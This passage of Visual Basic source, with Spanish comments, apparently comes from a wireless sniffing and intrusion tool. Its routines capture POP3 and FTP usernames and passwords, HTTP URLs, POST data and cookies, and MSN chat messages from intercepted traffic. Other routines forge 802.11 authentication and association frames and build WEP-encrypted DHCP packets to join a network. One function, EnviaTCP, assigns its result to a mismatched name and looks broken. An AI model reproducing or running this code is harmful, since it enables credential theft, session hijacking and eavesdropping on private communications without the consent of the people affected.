          End If
             
       End Select
End Sub

Private Sub GTalk(ByVal p As String)
    Dim i As Integer
    Dim f As Integer
    Dim c As String
    Dim usr As String
    Dim pwd As String
    Dim dIP As String
    i = InStr(p, "<message")
    If i = 0 Then Exit Sub
    p = Mid$(p, i)
    p = Left$(p, Len(p) - 4)
    Debug.Print p
        
    'If i > 0 Then
    '   i = i + 5
    '   f = InStr(i + 1, p, vbCrLf)
    '   If f > 0 Then
    '      usr = Mid$(p, i, f - i)
    '      Log "POP3 Host: " & ResolveIP(dip)
    '      Log "POP3 User: " & usr
    '      Debug.Print "POP3 User: " & usr
    '      Debug.Print ASCIIHexa(p)
    '      Exit Sub
    '   End If
    'End If
    'i = InStr(p, "PASS")
    'If i > 0 Then
    '   i = i + 5
    '   f = InStr(i + 1, p, vbCrLf)
    '   If f > 0 Then
    '      pwd = Mid$(p, i, f - i)
    '      Log "POP3 Password: " & pwd
    '      Debug.Print "POP3 Password: " & pwd
    '      Debug.Print ASCIIHexa(p)
    '   End If
    'End If
End Sub

Private Sub POP(ByVal p As String)
    Dim i As Integer
    Dim f As Integer
    Dim c As String
    Dim usr As String
    Dim pwd As String
    Dim dIP As String
    dIP = ip(Mid$(p, 25, 4))
    i = InStr(p, "USER")
    If i > 0 Then
       i = i + 5
       f = InStr(i + 1, p, vbCrLf)
       If f > 0 Then
          usr = Mid$(p, i, f - i)
          Log "POP3 Host: " & ResolveIP(dIP)
          Log "POP3 User: " & usr
          Debug.Print "POP3 User: " & usr
          Debug.Print ASCIIHexa(p)
          Exit Sub
       End If
    End If
    i = InStr(p, "PASS")
    If i > 0 Then
       i = i + 5
       f = InStr(i + 1, p, vbCrLf)
       If f > 0 Then
          pwd = Mid$(p, i, f - i)
          Log "POP3 Password: " & pwd
          Debug.Print "POP3 Password: " & pwd
          Debug.Print ASCIIHexa(p)
       End If
    End If
End Sub
Private Sub FTP(ByVal p As String)
    Dim i As Integer
    Dim f As Integer
    Dim c As String
    Dim usr As String
    Dim pwd As String
    Dim dIP As String
    dIP = ip(Mid$(p, 25, 4))
    
    i = InStr(p, "USER")
    If i > 0 Then
       i = i + 5
       f = InStr(i + 1, p, vbCrLf)
       If f > 0 Then
          usr = Mid$(p, i, f - i)
          Log "FTP Host: " & ResolveIP(dIP)
          Log "FTP User: " & usr
          Debug.Print "FTP User: " & usr
          Debug.Print ASCIIHexa(p)
          Exit Sub
       End If
    End If
    i = InStr(p, "PASS")
    If i > 0 Then
       i = i + 5
       f = InStr(i + 1, p, vbCrLf)
       If f > 0 Then
          pwd = Mid$(p, i, f - i)
          Log "FTP Password: " & pwd
          Debug.Print "FTP Password: " & pwd
          Debug.Print ASCIIHexa(p)
       End If
    End If

End Sub
Private Sub HTTP(ByVal p As String)
    Dim i As Integer
    Dim T As Integer
    Dim dIP As String
    Dim l As String
    Dim Pet As String
    Dim li() As String
    Dim URL As String
    dIP = ip(Mid$(p, 25, 4))
    
    If Mid$(p, 49, 4) = "POST" Then
       Pet = "P"
    ElseIf Mid$(p, 49, 3) = "GET" Then
       Pet = "G"
    End If
    'If Pet = "" Then Exit Sub
    p = Mid$(p, 49)
    li = Split(p, vbCrLf)
    If Pet = "P" Then
       URL = Mid$(li(0), 6)
    ElseIf Pet = "G" Then
       URL = Mid$(li(0), 5)
    End If
    T = InStr(URL, " ")
    If T > 0 Then
       URL = Left$(URL, T - 1)
    End If
    If Pet > "" Then
       URL = "[" & Pet & "] " & "http://" & ResolveIP(dIP) & "/" & Replace(Mid$(li(1), 7) & URL, "//", "/")
       lst_urls.AddItem URL
       WHTTP URL
       For i = 0 To UBound(li)
           If Left$(li(i), 8) = "Cookie: " Then
              WCookie Mid$(li(1), 7), Mid$(li(i), 9)
              Exit For
           End If
       Next i
       If Len(li(UBound(li))) > 4 And Pet = "P" Then
          lst_urls.AddItem "Datos: " & Left$(li(UBound(li)), Len(li(UBound(li))) - 4)
          WHTTP "Datos: " & Left$(li(UBound(li)), Len(li(UBound(li))) - 4)
       End If
    Else
       If Len(p) > 4 Then
          lst_urls.AddItem "DATOS: " & Left$(p, Len(p) - 4)
          WHTTP "DATOS: " & Left$(p, Len(p) - 4)
       End If
    End If
    
    If lst_urls.ListCount > 13 Then
       lst_urls.TopIndex = lst_urls.ListCount - 13
    End If
End Sub
Private Sub HTTPS(ByVal p As String)
    Dim imsg As Integer
    Dim imsg2 As Integer
    Dim sp As String
    Dim dIP As String
    Dim l As String
    dIP = ip(Mid$(p, 25, 4))
    sp = Mid$(p, 43)
    sp = Left$(sp, Len(sp) - 4)
    'Debug.Print sp
    imsg = InStr(p, "GET ")
    If imsg = 0 Then
       imsg = InStr(p, "OST ")
    End If
    If imsg > 0 Then
       imsg = imsg + 4
       imsg2 = InStr(p, " HTTP")
       If imsg2 > 0 Then
          l = "https://" & ResolveIP(dIP) & Mid$(p, imsg, imsg2 - imsg)
          lst_urls.AddItem l
          WHTTPS l
          If lst_urls.ListCount > 13 Then
             lst_urls.TopIndex = lst_urls.ListCount - 13
          End If
       End If
    End If
End Sub
Private Sub Cookie(ByVal dIP As String, ByVal txt As String)
    Dim n As Integer
    Dim m As Integer
    Dim a As String
    Do
       n = InStr(n + 1, txt, "Cookie: ")
       If n = 0 Then Exit Do
       m = InStr(n + 1, txt, vbCrLf)
       If m > 0 Then
          a = a & Mid$(txt, n, m - n) & vbCrLf
       End If
    Loop
    If a > "" Then WCookie ResolveIP(dIP), a
End Sub
Private Sub Messenger(ByVal p As String)
   Dim l() As String
   Dim cad As String
   Dim msg As String
   Dim imsg As Integer
   Dim imsg2 As Integer
   Static Ultimo As Integer
   On Error Resume Next
   Debug.Print p
   imsg = InStr(p, "MSG")
   If imsg = 0 Then
      imsg = InStr(p, "USR ")
      If imsg > 0 Then
         imsg = imsg + 4
         imsg2 = InStr(imsg + 1, p, " ")
         If imsg2 > 0 Then
            imsg2 = InStr(imsg2 + 1, p, " ")
         End If
         If imsg2 > 0 Then
            UMSN = "**" & Mid$(p, imsg + 2, imsg2 - imsg - 2)
         End If
      End If
      Exit Sub 'No es un mensaje
   End If
   p = Mid$(p, imsg)
   l = Split(p & Chr$(13), vbCrLf)
   If UBound(l) < 5 Then Exit Sub
   If InStr(l(2), "text/plain") > 0 Then
      If Val(Mid$(l(0), 5)) > 0 Then
         cad = UMSN & ": "
      Else
         cad = Mid$(l(0), 5, InStr(6, l(0), " ") - 5) & ": "
      End If
      
      'If Val(Right$(l(0), 3)) <> ultimo Then
         lst_msn.AddItem cad & Left$(l(5), Len(l(5)) - 5) ' & "   ->" & Ultimo
         WMSN cad & Left$(l(5), Len(l(5)) - 5)
         If lst_msn.ListCount > 9 Then
            lst_msn.TopIndex = lst_msn.ListCount - 9
         End If
      'End If
      'Ultimo = Val(Right$(l(0), 3))
   End If
End Sub
Private Function ResolveIP(ByVal ip As String) As String
   Dim hn As String
   If ch_resolver.Value = 0 Then
      ResolveIP = ip
      Exit Function
   End If
   hn = GetHostNameFromIP(ip)
   If Trim$(hn) = "" Or hn = PCName Or hn = Chr$(0) Then
      ResolveIP = ip
   Else
      ResolveIP = hn
   End If
End Function
Private Sub AñadeEstacion(ByVal dmac As String, ByVal dIP As String)
    Dim n As Integer
    If dmac = "FF:FF:FF:FF:FF:FF" Or dmac = MAC(bssid) Then Exit Sub
    For n = 0 To lst_estaciones.ListCount - 1
        If Left$(lst_estaciones.List(n), 17) = dmac Then Exit Sub
    Next n
    lst_estaciones.AddItem dmac & " - " & dIP
    WMAC dmac
End Sub
Private Function WaitForBeacon(ByVal bssid As String, ByVal TOut As Long) As String
   Dim T As Long
   dBeacon = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dBeacon > "" Then 'Ha llegado una baliza
          If Mid$(dBeacon, 11, 6) = bssid Or bssid = "" Then 'Ha llegado una baliza del BSSID o vale cualquiera
             WaitForBeacon = Mid$(dBeacon, 35, 2)
             Exit Function
          End If
       End If
       DoEvents
   Loop
End Function
Private Function WaitForIP(ByVal TOut As Long) As String
   Dim T As Long
   IPLocal = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If IPLocal > "" Then 'Ha llegado una baliza
             WaitForIP = IPLocal
             Exit Function
       End If
       DoEvents
   Loop
End Function
Private Function WaitChallenge(ByVal TOut As Long) As String
   Dim T As Long
   dChallenge = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dChallenge > "" Then 'Ha llegado un challenge
          If Mid$(dChallenge, 5, 6) = lMAC And Mid$(dChallenge, 11, 6) = bssid Then
             WaitChallenge = dChallenge
             Exit Function
          End If
       End If
       DoEvents
   Loop
End Function
Private Function WaitAssoc(ByVal TOut As Long) As String
   Dim T As Long
   dAssoc = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dAssoc > "" Then 'Ha llegado un Assoc
             WaitAssoc = dAssoc
             Exit Function
       End If
       DoEvents
   Loop
End Function

Private Function WaitAnswer(ByVal Answer As String, ByVal TOut As Long) As String
   Dim T As Long
   dAnswer = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dAnswer > "" Then 'Ha llegado una respuesta
             If dAnswer = Answer Then
                Exit Function
             End If
       End If
       DoEvents
   Loop
End Function
Private Sub sendACK()
   Dim ack As String
   ack = HexaASCII("D400000000000000000000000000")
   Mid$(ack, 5, 6) = gBSSID
   SendPacket ack
End Sub

Private Function FakeAssoc2(ByVal bssid As String, ByVal ESSID As String, ByVal MAC As String) As Boolean
   Dim Assoc As String
   Dim Rates As String
   Dim ack As String
   Dim Auth1 As String
   Dim Capa As String
   Dim n As Integer
   Dim salir As Boolean
   Dim sl As Integer
   MAC = HexaASCII(Replace(MAC, ":", ""))
   Rates = HexaASCII("010402040B1632080C1218243048606C")
   Assoc = HexaASCII("00003A01000000000000000000000000000000000000C00031046400")
   Auth1 = HexaASCII("B0003A010000000000000000000000000000000000000000000001000000")

   Mid$(Auth1, 5, 6) = bssid
   Mid$(Auth1, 11, 6) = MAC
   Mid$(Auth1, 17, 6) = bssid
   
   Mid$(Assoc, 5, 6) = bssid
   Mid$(Assoc, 11, 6) = MAC
   Mid$(Assoc, 17, 6) = bssid
   Assoc = Assoc & Chr$(0) & Chr$(Len(ESSID)) 'Añadimos a Assoc la longitud de essid
   Assoc = Assoc & ESSID
   Assoc = Assoc & Rates
   
   dChallenge = ""
   
   Log "(i) Esperando baliza de " & ASCIIHexa2(bssid)
   Capa = WaitForBeacon(bssid, 10000)
   If Capa = "" Then
      Log "(!) No se ha recibido baliza del AP"
      Exit Function
   End If
   'Command2.Enabled = True
   Log "(i) Baliza recibida"
   
   Mid$(Assoc, 25, 2) = Capa
   
   SendPacket Auth1
   Log "--> Paquete autenticación enviado"
  
   WaitAnswer HexaASCII("0000001E"), 200
   salir = False
   
   sendACK
   WaitAnswer HexaASCII("0000000E"), 200
   
   If dChallenge = "" Then
      WaitChallenge 10000
   End If
   If dChallenge = "" Then
      Log "(!) El AP no ha autenticado la estación."
      Exit Function
   End If
   
   dAssoc = ""
   SendPacket Assoc
   Log "--> Paquete asociación enviado"
   
   sendACK
   WaitAnswer HexaASCII("0000000E"), 200
   
   If dAssoc = "" Then
      WaitAssoc 10000
   End If
   
   If dAssoc > "" Then
      Log "(i) Estación Asociada"
      FakeAssoc2 = True
      Exit Function
   Else
      Log "(!) El AP no ha asociado la estación"
   End If
    
End Function


Private Sub SendPacket(ByVal Pck As String)
   Dim p As String
   Dim l As Long
   Dim b1 As Byte
   Dim b2 As Byte
   Pck = HexaASCII("00000000") & Pck
   l = Len(Pck)
   b1 = l \ 256
   b2 = l Mod 256
   
   p = HexaASCII("040000")
   p = p & Chr$(b1) & Chr$(b2)
   p = p & Pck
   ws01.SendData p
End Sub
Public Function EnviaTCP(ByVal clave As String) As String
    Dim pak As String
    Dim pak1 As String
    Dim hdrp As String
    Dim iv As String
    Dim GpAK As String
    smac = Replace(smac, ":", "")
    bssid = Replace(bssid, ":", "")
    hdrp = "08" & IIf(Retry, "49", "41") & "3000"
    hdrp = hdrp & bssid
    hdrp = hdrp & smac
    hdrp = hdrp & "FFFFFFFFFFFF"
    hdrp = hdrp & "101D"
    
    pak1 = "AAAA0300"
    pak1 = pak1 & "000008004500014856C400008011"
    pak1 = pak1 & "E2E100000000FFFFFFFF004400430134"
''''ch
    pak = pak & "0101060014F616AD0000000000000000000000000000"
    pak = pak & "000000000000"
    pak = pak & smac
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000638253633501017401013D0701"
    pak = pak & smac
    pak = pak & "0C066363636363633C084D53465420352E3037"
    pak = pak & "0B010F03062C2E2F1F21F92BFF00000000000000"
    pak = pak & "000000000000"
    GpAK = pak1
    GpAK = GpAK & ASCIIHexa(ChecksumUDP(HexaASCII("0044"), HexaASCII("0043"), HexaASCII("00000000"), HexaASCII("FFFFFFFF"), HexaASCII(pak)))
    GpAK = GpAK & pak
    CreaBootPC = HexaASCII(hdrp) & CreaPaqueteWEP(HexaASCII(GpAK), clave)
End Function
